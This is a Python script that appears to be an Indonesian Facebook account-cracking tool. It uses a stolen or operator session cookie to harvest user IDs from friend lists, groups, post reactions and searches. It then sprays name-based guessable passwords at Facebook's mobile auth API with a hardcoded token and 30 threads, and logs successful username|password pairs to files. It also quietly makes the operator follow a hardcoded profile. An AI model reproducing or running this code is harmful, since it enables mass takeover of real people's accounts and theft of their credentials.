# DECRYPTED BY xXx_not_found_xXx
# Github : https://github.com/hamalord4444
 #My Facebook (https://m.facebook.com/KM39453)
import os,sys,time,requests,json,re
from bs4 import BeautifulSoup as parser
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Back
B = Fore.BLUE
W = Fore.WHITE
C = Fore.CYAN
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW

#Author    : YayanXD
#Instagram : @yayanxd_
#My Facebook (https://m.facebook.com/KM39453)

id=[]
count=0
result=0
chek=0
die=0
check=[]
vuln=[]
mbasic="https://mbasic.facebook.com{}"
def clear():
    os.system('clear')
def baner():    
    print(f'''
{B}   ______     __ __       __  
{B}  / ____/____/ // / _____/ /__
{B} / /   / ___/ // /_/ ___/ //_/ {R}Fuck fb system.
{W}/ /___/ /  /__  __/ /__/ ,<   
{W}\____/_/     /_/  \___/_/|_|
{B}──────────────────────────────────────────────────
{Y}>> {W}Author         {R}: {C}YayanXD
{Y}>> {W}Instagram      {R}: {C}@yayanxd_
{Y}>> {W}Group Facebook {R}: {C}Hacker Termux Indonesia
{B}──────────────────────────────────────────────────''')
    print()

def masuk():
    try:
          cek = open("cookies").read()
    except FileNotFoundError:
          cek = input("\033[1;96mCookies Fb \033[1;91m: \033[1;92m")
    cek = {"cookie":cek}
    ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
    if "mbasic_logout_button" in str(ismi):
        if "Apa yang Anda pikirkan sekarang" in str(ismi):
            with open("cookies","w") as f:
                 f.write(cek["cookie"])
        else:
            try:
                 requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
            except:
                 pass
        try:
             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
             ses.get(mbasic.format(ikuti),cookies=cek)
        except:
             pass
        return cek["cookie"]
    else:
        print('\033[00mCookies \033[91mSalah\033[00m')
        time.sleep(1)
        os.system('python Kontol.py')
def nid():
    r=ses.get(mbasic.format('/me'),cookies=kukis).text
    name=re.findall(r'<title>(.*?)</title>',r)[0]
    uid=re.findall(r'name="target" value="(.*?)"',r)[0]
    print("\033[96mNama \033[93m: \033[92m"+name)
    print("\033[96mID   \033[93m: \033[92m"+uid)
    print('\033[94m──────────────────────────────────────────────────\033[00m')
def temanid(url):
    req=requests.get(url,cookies=kukis).content
    getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))
    for x in getuser:
        if 'profile' in x[0]:
            id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
        elif 'friends' in x:
            continue
        else:
            id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
        print(f'\r\033[1;92mTotal ID \033[91m: \033[93m{str(len(id))}',end='')
    if 'Lihat Teman Lain' in str(req):
        temanid(mbasic.format(parser(req,'html.parser').find('a',string='Lihat Teman Lain')['href']))
    return id
def targetteman(url):
    req=requests.get(url,cookies=kukis).content
    getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))
    for x in getuser:
        if 'profile' in x[0]:
            id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
        elif 'friends' in x:
            continue
        else:
            id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
        print(f'\r\033[1;92mTotal ID \033[91m: \033[93m{str(len(id))}',end='')
    if 'Lihat Teman Lain' in str(req):
        targetteman(mbasic.format(parser(req,'html.parser').find('a',string='Lihat Teman Lain')['href']))
    return id
def like(url):
    try:
        req=requests.get(url,cookies=kukis).content
        lk=re.findall(r'href="(/ufi.*?)"',str(req))[0]
        aws=getlike(mbasic.format(lk))
        return aws
    except:
        print('\033[91mFailed To Crack\033[00m')
        sleep(1)
        menu()
def getlike(react):
    like=requests.get(react,cookies=kukis).content
    lkusr= re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
    for user in lkusr:
        if 'profile' in user[0]:
            id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0].split('/')[1])
        print(f'\r\033[1;92mTotal ID \033[93m: \033[93m{str(len(id))}',end='')
    if 'Lihat Selengkapnya' in str(like):
        getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
    return id 
def grupid(url):
    req=requests.get(url,cookies=kukis).content
    users=re.findall(r'a class=".." href="/(.*?)">(.*?)</a>',str(req))
    for user in users:
        if "profile" in user[0]:
            id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0])
        print(f'\r\033[1;92mTotal ID \033[91m: \033[93m{str(len(id))}',end='')
    if "Lihat Selengkapnya" in str(req):
        grupid(mbasic.format(parser(req,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
    return id
def search(url):
    req=requests.get(url,cookies=kukis).content
    users=re.findall(r'class="s cc"><a href="(.*?)"><div class=".."><div class="..">(.*?)</div></div>',str(req))
    for user in users:
        if "profile" in user[0]:
            id.append(user[1] + "|" + re.findall("id=(\d*)",str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0].split("?")[0])
        print(f'\r\033[1;92mTotal ID \033[91m: \033[93m{str(len(id))}',end='')
    if "Lihat Hasil Selanjutnya" in str(req):
        search(parser(req,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
    return id
def kmn(url):
    req=requests.get(url,cookies=kukis).content
    users=re.findall(r'middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))
    for user in users:
        if "mbasic" in user[0]:
            id.append(user[1] + '|' + re.findall("uid=(\d*)",str(user[0]))[0])
        else:
            id.append(user[1] + '|' + re.findall("=(\d*)",str(user[0]))[0])
        print(f"\r\033[1;92mTotal ID \033[91m: \033[93m{str(len(id))}",end="")
    if "Lihat selengkapnya" in str(req):
        kmn(mbasic.format(parser(req,"html.parser").find("a",string="Lihat selengkapnya")["href"]))
    return id
def login(username,password,cek=False):
          global die,result,chek,count
          b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
          params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
          }
          api = 'https://b-api.facebook.com/method/auth.login'
          response = requests.get(api, params=params)
          if 'EAA' in response.text:
              print(f"\r\033[1;93m[\033[1;96m✓\033[1;93m] \033[1;32m{username}\033[90m|\033[1;32m{password}                        ",end="")
              print()
              result += 1
              if cek:
                      vuln.append(username+"|"+password)
              else:
                      with open('vuln.txt','a') as f:
                           f.write(username + '|' + password + '\n')
          elif 'www.facebook.com' in response.json()['error_msg']:
                print(f"\r\033[1;93m[\033[1;91m×\033[1;93m] \033[1;33m{username}\033[90m|\033[1;33m{password}                      ",end="")
                print()
                chek += 1
                if cek:
                      check.append(username+"|"+password)
                else:
                      with open('check.txt','a') as f:
                           f.write(username + '|' + password + '\n')
          else:
                die += 1
          tk=['\033[1;97m#','\033[1;96m#','\033[1;97m#','\033[1;91m#']
          for o in tk:
                     print(f"\r\033[1;93m[\033[1;96m✓\033[1;93m] \033[1;92mHacked \033[1;91m: \033[1;92m{str(result)} \033[1;93mCheck \033[1;91m: \033[1;93m{str(chek)} \033[1;94mDie \033[1;91m: \033[1;94m{str(die)}\033[00m",end="")
                     time.sleep(0.2)
def menu():
    clear()
    baner()
    nid()
    print('''
\033[92m{\033[96m1\033[92m} \033[00mCrack Dari Teman
\033[92m{\033[96m2\033[92m} \033[00mCrack Dari Teman Publik
\033[92m{\033[96m3\033[92m} \033[00mCrack Dari React Post
\033[92m{\033[96m4\033[92m} \033[00mCrack Dari Group
\033[92m{\033[96m5\033[92m} \033[00mCrack Dari Pencarian
\033[92m{\033[96m6\033[92m} \033[00mCrack Dari Permintaan Teman
\033[92m{\033[91m0\033[92m} \033[91mKeluar
\033[94m──────────────────────────────────────────────────''')
    pilih_menu()
def pilih_menu():
    ff=input('\033[93m>> \033[92m')
    if ff == '1':
       clear()
       baner()
       nid()
       usr=parser(ses.get(mbasic.format('/me'),cookies=kukis).content,'html.parser').find('a',string='Teman')
       username=temanid(mbasic.format(usr['href']))
       with ThreadPoolExecutor(max_workers=30) as ex:
            for user in username:
                aa=user.split('|')
                bb=aa[0].split(' ')
                for x in bb:
                    litpas=[
                         str(x) + '123',
                         str(x) + '1234',
                         str(x) + '12345',
                         str(x) + '123456'
                         ]
                    litpas.append('Sayang')
                    litpas.append('Bangsat')
                    litpas.append('Kontol')
                    litpas.append('Anjing')
                    for passw in set(litpas):
                        ex.submit(login,(aa[1]),(passw))
       print('\n\033[93m{\033[96m•\033[93m} \033[92mSelesai...')
    elif ff == '2':
       clear()
       baner()
       nid()
       asw=input('\033[1;96mId Fb publik \033[91m: \033[93m')
       if asw.isdigit():
          asw='/profile.php?id='+asw
       else:
          asw='/'+asw
       try:
           usr=parser(ses.get(mbasic.format(asw),cookies=kukis).content,'html.parser').find('a',string='Teman')
           username=targetteman(mbasic.format(usr["href"]))
       except TypeError:
           print('\033[91mUser Id Tidak ada\033[00m')
           sleep(1)
           menu()
       with ThreadPoolExecutor(max_workers=30) as ex:
            for user in username:
                aa=user.split('|')
                bb=aa[0].split(' ')
                for x in bb:
                    litpas=[
                         str(x) + '123',
                         str(x) + '1234',
                         str(x) + '12345',
                         str(x) + '123456'
                         ]
                    litpas.append('Sayang')
                    litpas.append('Bangsat')
                    litpas.append('Kontol')
                    litpas.append('Anjing')
                    for passw in set(litpas):
                        ex.submit(login,(aa[1]),(passw))
       print('\n\033[93m{\033[96m•\033[93m} \033[92mSelesai...')
    elif ff == '3':
         clear()
         baner()
         nid()
         asw=input('\033[1;96mlink postingan \033[91m: \033[93m')
         if 'www.facebook' in asw:
             asw=asw.replace('www.facebook','mbasic.facebook')
         elif 'm.facebook.com' in asw:
             asw=asw.replace('m.facebook.com','mbasic.facebook.com')
         elif asw == '':
             print('\033[91mTidak Boleh Kosong!\033[00m')
             sleep(1)
             menu()
         username=like(asw)
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      litpas.append('786786')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[93m{\033[96m•\033[93m} \033[92mSelesai...')
    elif ff == '4':
         clear()
         baner()
         nid()
         asw=input('\033[1;96mID Group \033[91m: \033[93m')
         username=grupid(mbasic.format('/browse/group/members/?id='+asw))
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      litpas.append('786786')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[93m{\033[96m•\033[93m} \033[92mSelesai...')
    elif ff == '5':
         clear()
         baner()
         nid()
         asw=input('\033[1;96mPertanyaan : \033[93m')
         username=search(mbasic.format('/search/people/?q='+asw))
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      litpas.append('786786')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[93m{\033[96m•\033[93m} \033[92mSelesai...')
    elif ff == '6':
         clear()
         baner()
         nid()
         username=kmn(mbasic.format('/friends/center/requests/#friends_center_main'))
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[93m{\033[96m•\033[93m} \033[92mSelesai...')
    elif ff == '0':
         sys.exit('\033[1;97mTerima kasih Telah Menggunakan Script Saya\n\033[91mexit\033[00m')
    else:
         print('\033[91mLihat menu nya dong ajg\033[00m')
         sleep(1)
         menu()
if __name__=="__main__":
     clear()
     baner()
     ses=requests.Session()
     kuki=masuk()
     kukis={'cookie':kuki}
     menu()
